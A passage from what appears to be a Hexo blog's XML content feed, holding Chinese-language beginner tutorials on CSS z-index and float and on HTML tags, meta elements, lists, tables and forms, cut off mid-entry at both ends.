0;</span><br><span class="line">    background-color: green;</span><br><span class="line">    border: 2px solid #4CAF50;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重叠的元素"><a href="#重叠的元素" class="headerlink" title="重叠的元素"></a>重叠的元素</h4><p>元素的定位与文档流无关，所以它们可以覆盖页面上的其它元素</p><p>z-index属性指定了一个元素的堆叠顺序（哪个元素应该放在前面，或后面）</p><p>一个元素可以有正数或负数的堆叠顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">img</span><br><span class="line">&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    left:0px;</span><br><span class="line">    top:0px;</span><br><span class="line">    z-index:-1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Float（浮动）"><a href="#Float（浮动）" class="headerlink" title="Float（浮动）"></a>Float（浮动）</h3><p><strong>什么是CSS Float（浮动）？</strong><br>CSS 的 Float（浮动），会使元素向左或向右移动，其周围的元素也会重新排列。<br>Float（浮动），往往是用于图像，但它在布局时一样非常有用</p><p><strong>元素怎样浮动</strong><br>元素的水平方向浮动，意味着元素只能左右移动而不能上下移动。</p><p>一个浮动元素会尽量向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。</p><p>浮动元素之后的元素将围绕它。</p><p>浮动元素之前的元素将不会受到影响。</p><p>如果图像是右浮动，下面的文本流将环绕在它左边：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">img</span><br><span class="line">&#123;</span><br><span class="line">    float:right&#x2F;right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>清除浮动 - 使用 clear</strong><br>元素浮动之后，周围的元素会重新排列，为了避免这种情况，使用 clear 属性。</p><p>clear 属性指定元素两侧不能出现浮动元素。</p><p>使用 clear 属性往文本中添加图片廊：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text_line</span><br><span class="line">&#123;</span><br><span class="line">    clear:none;</span><br><span class="line"></span><br><span class="line"> &lt;!--none是两边都不能，left和right是单边不能--&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML</title>
      <link href="posts/54626.html"/>
      <url>posts/54626.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTML是什么？"><a href="#HTML是什么？" class="headerlink" title="HTML是什么？"></a>HTML是什么？</h2><ul><li>超文本标记语言（Hypertext Markup Language, HTML）是一种用于创建网页的标记语言。<br>超文本: 就是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素。<br>标记语言: 标记（标签）构成的语言。</li></ul><h3 id="什么是标签"><a href="#什么是标签" class="headerlink" title="什么是标签:"></a>什么是标签:</h3><ul><li>是由一对尖括号包裹的单词构成 例如: <html> *所有标签中的单词不可能以数字开头.</li><li>标签不区分大小写.<html> 和 <HTML>. 推荐使用小写.</li><li>标签分为两部分: 开始标签<a> 和 结束标签</a>. 两个标签之间的部分 我们叫做标签体.</li><li>有些标签功能比较简单.使用一个标签即可.这种标签叫做自闭和标签.例如: <code>&lt;br/&gt;&lt;hr/&gt;&lt;input/&gt;&lt;img/&gt;</code></li><li>标签可以嵌套.但是不能交叉嵌套. <code>&lt;a&gt;&lt;b&gt;&lt;/a&gt;&lt;/b&gt;</code></li></ul><h3 id="标签的属性"><a href="#标签的属性" class="headerlink" title="标签的属性:"></a>标签的属性:</h3><ul><li>通常是以键值对形式出现的. 例如 name=”nick”</li><li>属性只能出现在开始标签 或 自闭和标签中.</li><li>属性名字全部小写. *属性值必须使用双引号或单引号包裹 例如 name=”nick”</li><li>如果属性值和属性名完全一样.直接写属性名即可. 例如 readonly</li></ul><h3 id="HTML5基本结构"><a href="#HTML5基本结构" class="headerlink" title="HTML5基本结构:"></a>HTML5基本结构:</h3><p>　　将HTML4中的DTD定义为如下结构即可，其他不变。</p><ol><li><code>&lt;!DOCTYPE HTML&gt;</code></li></ol><h3 id="HTML5支持的两种指定页面使用的字符集的方式"><a href="#HTML5支持的两种指定页面使用的字符集的方式" class="headerlink" title="HTML5支持的两种指定页面使用的字符集的方式:"></a>HTML5支持的两种指定页面使用的字符集的方式:</h3><ul><li><p>使用Content-Type指定字符集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html ;charset&#x3D;UTF-8&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure></li><li><p>直接使用charset指定字符集<br><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code></p></li></ul><br><hr><h2 id="HMTL-基础"><a href="#HMTL-基础" class="headerlink" title="HMTL 基础"></a>HMTL 基础</h2><ol><li><p>HTML 标题</p><ul><li>HTML标题(Heading)通过<code>&lt;h1&gt;-&lt;h6&gt;</code>标签来定义的<figure class="highlight plain"><figcaption><span>.... </h1></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    &lt;h2&gt; .... &lt;&#x2F;h2&gt; &#96;&#96;&#96;</span><br><span class="line">2. HTML 段落</span><br><span class="line"></span><br><span class="line">- HTML段落是通过标签&#96;&#96;&#96; &lt;p&gt; &#96;&#96;&#96;来定义的</span><br><span class="line">&#96;&#96;&#96;&lt;p&gt;...&lt;&#x2F;p&gt;&#96;&#96;&#96;</span><br><span class="line">3. HTML 链接</span><br><span class="line"></span><br><span class="line">- HTML 链接是通过标签&#96;&#96;&#96; &lt;a&gt; &#96;&#96;&#96;来定义的</span><br><span class="line">&#96;&#96;&#96; &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;...&lt;&#x2F;a&gt;&#96;&#96;&#96;</span><br><span class="line">4. HTML 图像</span><br><span class="line"></span><br><span class="line">- HTML 图像是通过标签&#96;&#96;&#96; &lt;img&gt; &#96;&#96;&#96;来定义的</span><br></pre></td></tr></table></figure><img loading="lazy" src="/images/logo.png" width="x" height="y" /> ```</li></ul></li><li><p>tips:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.xxx.html文件和xxx.jpg文件的相对路径</span><br><span class="line">1.1若两者在同一目录下：</span><br><span class="line">&lt;img src&#x3D;&quot;xxx.jpg&quot; width&#x3D;&quot;xxx&quot; height &#x3D; &quot;xxx&quot; &#x2F;&gt;</span><br><span class="line">1.2若二者在不同目录下：</span><br><span class="line">a.图片 *.jpg 在 image 文件夹中，*.html 跟 image 在同一目录下：</span><br><span class="line">&lt;img src&#x3D;&quot;image&#x2F;xxx.jpg&#x2F;&quot;width&#x3D;&quot;xxx&quot; height&#x3D;&quot;xxx&quot;&#x2F;&gt;</span><br><span class="line">b.图片 *.jpg 在 image 文件夹中，xxx.html 在 Web 文件夹中，image 跟 Web 在同一目录下：</span><br><span class="line">&lt;img src&#x3D;&quot;..&#x2F;image&#x2F;xxx.jpg&#x2F;&quot;width&#x3D;&quot;xxx&quot; height&#x3D;&quot;xxx&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"> 2.若图片源于网络，使用绝对路径：</span><br><span class="line">&gt;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;xxx.xxx.com&#x2F;xxx...&#x2F;xxx.png&quot;</span><br></pre></td></tr></table></figure><br><hr></li></ol><h2 id="HTML文档结构"><a href="#HTML文档结构" class="headerlink" title="HTML文档结构"></a>HTML文档结构</h2><p>最基本的HTML文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt; html文档 &lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><ol><li><p><code>&lt;!DOCTYPE html&gt;</code>声明为HTML5文档。</p></li><li><p><code>&lt;html&gt;</code>、<code>&lt;/html&gt;</code>是文档的开始标记和结束的标记。是HTML页面的根元素，在它们之间是文档的头部（head）和主体（body）。</p></li><li><p><code>&lt;head&gt;</code>、<code>&lt;/head&gt;</code>定义了HTML文档的开头部分。它们之间的内容不会在浏览器的文档窗口显示。包含了文档的元（meta）数据。</p></li><li><p><code>&lt;title&gt;</code>、<code>&lt;/title&gt;</code>定义了网页标题，在浏览器标题栏显示。</p></li><li><p><code>&lt;body&gt;</code>、<code>&lt;/body&gt;</code>之间的文本是可见的网页主体内容。</p></li></ol><br><hr><h2 id="HTML-标签格式"><a href="#HTML-标签格式" class="headerlink" title="HTML 标签格式"></a>HTML 标签格式</h2><ul><li>标签的基本信息：<ul><li><p>HTML标签是由尖括号包围的关键字，如<code>&lt;html&gt;</code>, <code>&lt;div&gt;</code>等</p></li><li><p>HTML标签通常是成对出现的，比如：<code>&lt;div&gt;</code>和<code>&lt;/div&gt;</code>，第一个标签是开始，第二个标签是结束。结束标签会有斜线。</p></li><li><p>也有一部分标签是单独呈现的，比如：<code>&lt;br/&gt;、&lt;hr/&gt;、&lt;img src=&quot;1.jpg&quot; /&gt;</code>等。</p></li><li><p>标签里面可以有若干属性，也可以不带属性</p></li></ul></li><li>标签的语法<ul><li><p>&lt;标签名 属性1=“属性值1” 属性2=“属性值2”……&gt;内容部分&lt;/标签名&gt;</p></li><li><p>&lt;标签名 属性1=“属性值1” 属性2=“属性值2”…… /&gt;</p></li></ul></li><li>重要的属性：<ul><li><p>id：定义标签的唯一ID，HTML文档树中唯一</p></li><li><p>class：为html元素定义一个或多个类名（classname）(CSS样式类名)</p></li><li><p>style：规定元素的行内样式（CSS样式）</p></li></ul></li></ul><br><hr><h2 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h2><p><code>&lt;!--注释内容，这里边的信息不会显示出来--&gt;</code></p><br><hr><h2 id="lt-DOCTYPE-gt-标签"><a href="#lt-DOCTYPE-gt-标签" class="headerlink" title="&lt;!DOCTYPE&gt; 标签"></a>&lt;!DOCTYPE&gt; 标签</h2><!DOCTYPE><p> 声明必须是 HTML 文档的第一行，位于 <html> 标签之前。</p><!DOCTYPE><p> 声明不是 HTML 标签；它是指示 web 浏览器关于页面使用哪个 HTML 版本进行编写的指令。</p><br><hr><h2 id="HTML-常用标签"><a href="#HTML-常用标签" class="headerlink" title="HTML 常用标签"></a>HTML 常用标签</h2><h3 id="在head内常用的标签"><a href="#在head内常用的标签" class="headerlink" title="在head内常用的标签"></a>在head内常用的标签</h3><table><thead><tr><th align="center">标签</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center"><code>&lt;title&gt;&lt;/title&gt;</code></td><td align="center">定义网页标题</td></tr><tr><td align="center"><code>&lt;style&gt;&lt;/style&gt;</code></td><td align="center">定义内部样式表</td></tr><tr><td align="center"><code>&lt;script&gt;&lt;/script&gt;</code></td><td align="center">定义JS代码或引入外部JS文件</td></tr><tr><td align="center"><code>&lt;link/&gt;</code></td><td align="center">引入外部样式表文件,重要属性有三个：rel、href、type。</td></tr><tr><td align="center"><code>&lt;meta/&gt;</code></td><td align="center">定义网页原信息</td></tr><tr><td align="center"><code>&lt;base/&gt;</code></td><td align="center">标签为页面上的所有链接规定默认地址或默认目标</td></tr></tbody></table><!--`|--|`第二行是为了定义表格的对齐方式，":-"左对齐，":-:"居中对齐，"-:"右对齐--><h4 id="Meta标签"><a href="#Meta标签" class="headerlink" title="Meta标签"></a>Meta标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Meta标签介绍：</span><br><span class="line">1.&lt;meta&gt;元素可提供有关页面的元信息（mata-information）,针对搜索引擎和更新频度的描述和关键词。</span><br><span class="line">2. &lt;meta&gt;标签位于文档的头部，不包含任何内容。</span><br><span class="line">3. &lt;meta&gt;提供的信息是用户不可见的。</span><br></pre></td></tr></table></figure><p>定义关于HTML文档的元数据。 重要的属性有三个：http-equiv、name、content</p><p>http-equiv  把content属性值关联到http头部。</p><ul><li>Content-Type（浏览器接受的文档类型，一般是text/html）</li><li>refresh（网页刷新，以秒为单位）</li><li>expires（设定网页到期时间，一旦过期，必须到服务器上重传）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. &#96;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html ;charset&#x3D;UTF-8&quot;&#x2F;&gt;&#96;</span><br><span class="line">2. &#96;&lt;meta http-equiv&#x3D;&quot;Refresh&quot; content&#x3D;&quot;2&quot;&gt;&#96;</span><br><span class="line">3. &#96;&lt;meta http-equiv&#x3D;&quot;Refresh&quot; content&#x3D;&quot;2;URL&#x3D;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;&#96;</span><br><span class="line">4. &#96;&lt;meta http-equiv&#x3D;&quot;expires&quot; content&#x3D;&quot;6 Jun 2016&quot;&#x2F;&gt;&#96;</span><br></pre></td></tr></table></figure><p>name属性: 主要用于描述网页，把content属性关联到一个名称，content中的内容主要是便于搜索引擎机器人查找信息和分类信息用的。</p><ul><li>keywords（搜索关键字，用于搜索引擎抓取信息的显示）</li><li>description（搜索到网站后显示的网页内容简描述）</li><li>author（站点制作者信息）</li><li>generator（用以说明生成工具）</li><li>name也可以根据特定的功能自定义，在新浪网中有使用360认证和搜狐认证<code>（&lt;meta name=&quot;360-site-verification&quot;content=&quot;63349**********&quot;/&gt;、&lt;meta name=&quot;sogou_site_verification&quot;content=&quot;BVI*******&quot;/&gt;）。</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;搜索关键字&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;简要描述&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;http:&#x2F;&#x2F;cnblogs.com&#x2F;suoning&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;generator&quot; content&#x3D;&quot;用以说明生成工具&quot;&gt;</span><br></pre></td></tr></table></figure>content  定义与http-equiv或name属性相关的元信息，是必要的属性。</li></ul><h3 id="body内常用"><a href="#body内常用" class="headerlink" title="body内常用"></a>body内常用</h3><ul><li>基本标签(块级标签和内联标签)</li><li>块级标签：<code>&lt;p&gt;&lt;h1&gt;&lt;table&gt;&lt;ol&gt;&lt;ul&gt;&lt;form&gt;&lt;div&gt;</code></li><li>内联标签：<code>&lt;a&gt;&lt;input&gt;&lt;img&gt;&lt;sub&gt;&lt;sup&gt;&lt;textarea&gt;&lt;span&gt;</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;&#x2F;b&gt;</span><br><span class="line">&lt;i&gt;斜体&lt;&#x2F;i&gt;</span><br><span class="line">&lt;em&gt;斜体&lt;em&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;&#x2F;u&gt;</span><br><span class="line">&lt;s&gt;删除&lt;&#x2F;s&gt;</span><br><span class="line">&lt;strike&gt;: 为文字加上一条中线</span><br><span class="line">&lt;sup&gt;和&lt;sub&gt;: 上角标 和 下角标</span><br><span class="line"></span><br><span class="line">&lt;p&gt;段落标签&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;标题1&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2&gt;标题2&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;h3&gt;标题3&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;h4&gt;标题4&lt;&#x2F;h4&gt;</span><br><span class="line">&lt;h5&gt;标题5&lt;&#x2F;h5&gt;</span><br><span class="line">&lt;h6&gt;标题6&lt;&#x2F;h6&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--注释--&gt;</span><br><span class="line">&lt;br&gt;： 换行</span><br><span class="line">&lt;hr&gt;： 水平线</span><br><span class="line">&lt;div&gt;</span><br><span class="line"></span><br><span class="line">        块级标签。块级标签常用于布局，行级标签常用语显示内容。</span><br><span class="line"></span><br><span class="line">　　    div的显示通常使用id或class来标识。id为唯一的标签标识，class为标签的类标识。</span><br><span class="line"></span><br><span class="line">　　    div的大小是由内容来决定的，默认情况下，高度由内容的高度决定，宽度适应屏幕。</span><br><span class="line"></span><br><span class="line">　　    可以容纳其他元素，是一个容器。</span><br><span class="line"></span><br><span class="line">&lt;span&gt;</span><br></pre></td></tr></table></figure><ul><li>特殊字符</li></ul><table><thead><tr><th align="center">内容</th><th align="center">对应代码</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center"></td></tr><tr><td align="center">&gt;</td><td align="center"><code>&amp;gt;</code></td></tr><tr><td align="center">&lt;</td><td align="center"><code>&amp;lt;</code></td></tr><tr><td align="center">&amp;</td><td align="center"><code>&amp;amp;</code></td></tr><tr><td align="center">¥</td><td align="center"><code>&amp;yen;</code></td></tr><tr><td align="center">版权©</td><td align="center"><code>&amp;copy;</code></td></tr><tr><td align="center">注册®</td><td align="center"><code>&amp;reg;</code></td></tr></tbody></table><h4 id="div标签和span标签"><a href="#div标签和span标签" class="headerlink" title="div标签和span标签"></a>div标签和span标签</h4><p>div标签用来定义一个块级元素，并无实际的意义。主要通过CSS样式为其赋予不同的表现。<br>span标签用来定义内联(行内)元素，并无实际的意义。主要通过CSS样式为其赋予不同的表现。</p><p>块级元素与行内元素的区别：<br>所谓块元素，是以另起一行开始渲染的元素，行内元素则不需另起一行。如果单独在网页中插入这两个元素，不会对页面产生任何的影响。<br>这两个元素是专门为定义CSS样式而生的。</p><p>注意：</p><p>关于标签嵌套：通常块级元素可以包含内联元素或某些块级元素，但内联元素不能包含块级元素，它只能包含其它内联元素。</p><p>p标签不能包含块级标签，p标签也不能包含p标签。</p><h4 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a>img 标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;图片的路径&quot; alt&#x3D;&quot;图片未加载成功时的提示&quot; title&#x3D;&quot;鼠标悬浮时提示信息&quot; width&#x3D;&quot;宽&quot; height&#x3D;&quot;高(宽高两个属性只用一个会自动等比缩放)&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h4><p>超链接标签</p><p>所谓的超链接是指从一个网页指向一个目标的连接关系，这个目标可以是另一个网页，也可以是相同网页上的不同位置，还可以是一个图片，一个电子邮件地址，一个文件，甚至是一个应用程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.oldboyedu.com&quot; target&#x3D;&quot;_blank&quot; &gt;点我&lt;&#x2F;a&gt;</span><br><span class="line">href属性指定目标网页地址。该地址可以有几种类型：</span><br><span class="line"></span><br><span class="line">绝对URL - 指向另一个站点（比如 href&#x3D;&quot;http:&#x2F;&#x2F;www.jd.com）</span><br><span class="line">相对URL - 指当前站点中确切的路径（href&#x3D;&quot;index.htm&quot;）</span><br><span class="line">锚URL - 指向页面中的锚（href&#x3D;&quot;#top&quot;）</span><br><span class="line"> </span><br><span class="line">target：</span><br><span class="line"></span><br><span class="line">_blank表示在新标签页中打开目标网页</span><br><span class="line">_self表示在当前标签页中打开目标网页</span><br><span class="line"></span><br><span class="line">URL</span><br><span class="line">什么是URL？</span><br><span class="line">URL是统一资源定位器(Uniform Resource Locator)的缩写，也被称为网页地址，是因特网上标准的资源的地址。</span><br><span class="line">URL举例</span><br><span class="line">http:&#x2F;&#x2F;www.sohu.com&#x2F;stu&#x2F;intro.html</span><br><span class="line">http:&#x2F;&#x2F;222.172.123.33&#x2F;stu&#x2F;intro.html</span><br><span class="line"></span><br><span class="line">URL地址由4部分组成</span><br><span class="line">第1部分：为协议：http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;等 </span><br><span class="line">第2部分：为站点地址：可以是域名或IP地址</span><br><span class="line">第3部分：为页面在站点中的目录：stu</span><br><span class="line">第4部分：为页面名称，例如 index.html</span><br><span class="line">各部分之间用“&#x2F;”符号隔开。</span><br></pre></td></tr></table></figure><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><h5 id="1-无序列表"><a href="#1-无序列表" class="headerlink" title="1. 无序列表"></a>1. 无序列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul type&#x3D;&quot;disc&quot;&gt;</span><br><span class="line">  &lt;li&gt;第一项&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li&gt;第二项&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure><p>type属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">disc（实心圆点，默认值）</span><br><span class="line">circle（空心圆圈）</span><br><span class="line">square（实心方块）</span><br><span class="line">none（无样式）</span><br></pre></td></tr></table></figure><h5 id="2-有序列表"><a href="#2-有序列表" class="headerlink" title="2. 有序列表"></a>2. 有序列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol type&#x3D;&quot;1&quot; start&#x3D;&quot;2&quot;&gt;</span><br><span class="line">  &lt;li&gt;第一项&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li&gt;第二项&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br></pre></td></tr></table></figure><p>type属性：<br>1 数字列表，默认值<br>A 大写字母<br>a 小写字母<br>I 大写罗马<br>i 小写罗马</p><blockquote><blockquote><ol start="3"><li>标题列表</li></ol></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">  &lt;dt&gt;标题1&lt;&#x2F;dt&gt;</span><br><span class="line">  &lt;dd&gt;内容1&lt;&#x2F;dd&gt;</span><br><span class="line">  &lt;dt&gt;标题2&lt;&#x2F;dt&gt;</span><br><span class="line">  &lt;dd&gt;内容1&lt;&#x2F;dd&gt;</span><br><span class="line">  &lt;dd&gt;内容2&lt;&#x2F;dd&gt;</span><br><span class="line">&lt;&#x2F;dl&gt;</span><br></pre></td></tr></table></figure><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><p>表格是一个二维数据空间，一个表格由若干行组成，一个行又有若干单元格组成，单元格里可以包含文字、列表、图案、表单、数字符号、预置文本和其它的表格等内容。<br>表格最重要的目的是显示表格类数据。表格类数据是指最适合组织为表格格式（即按行和列组织）的数据。<br>表格的基本结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">  &lt;thead&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;th&gt;序号&lt;&#x2F;th&gt;</span><br><span class="line">    &lt;th&gt;姓名&lt;&#x2F;th&gt;</span><br><span class="line">    &lt;th&gt;爱好&lt;&#x2F;th&gt;</span><br><span class="line">  &lt;&#x2F;tr&gt;</span><br><span class="line">  &lt;&#x2F;thead&gt;</span><br><span class="line">  &lt;tbody&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;1&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;td&gt;Egon&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;td&gt;杠娘&lt;&#x2F;td&gt;</span><br><span class="line">  &lt;&#x2F;tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;2&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;td&gt;Yuan&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;td&gt;日天&lt;&#x2F;td&gt;</span><br><span class="line">  &lt;&#x2F;tr&gt;</span><br><span class="line">  &lt;&#x2F;tbody&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;table&gt;</code>表格标签属性:</p><ul><li>border: 表格边框</li><li>align：水平对齐方式</li><li>bgcolor：背景颜色</li><li>cellpadding: 内边距</li><li>cellspacing: 外边距.</li><li>width: 像素 百分比.（最好通过css来设置长宽）<caption>  表格的标题</li></ul><p><code>&lt;tr&gt;</code>  表格的数据行，table row<br><code>&lt;th&gt;</code>  表格的表头名称，与<code>&lt;td&gt;</code>不同在于文字采用加粗居中的形式显示，table head cell<br><code>&lt;td&gt;</code>  单元格，用来显示表格内容，table data cell</p><p><code>&lt;thead&gt;</code>：表格头部，使结构更加分明<br><code>&lt;tbody&gt;</code>：表格主体部分，使结构更加分明<br>rowspan: 单元格竖跨多少行,作用在th或者td上<br>colspan: 单元格横跨多少列（即合并单元格，作用在th或者td上</p><h4 id="lt-form-gt-表单标签"><a href="#lt-form-gt-表单标签" class="headerlink" title="&lt;form&gt;表单标签"></a><code>&lt;form&gt;</code>表单标签</h4><p>功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表单用于向服务器传输数据，从而实现用户与Web服务器的交互</span><br><span class="line">表单能够包含input系列标签，比如文本字段、复选框、单选框、提交按钮等等。</span><br><span class="line">表单还可以包含textarea、select、fieldset和 label标签。</span><br></pre></td></tr></table></figure><p>表单属性:</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">accept-charset</td><td 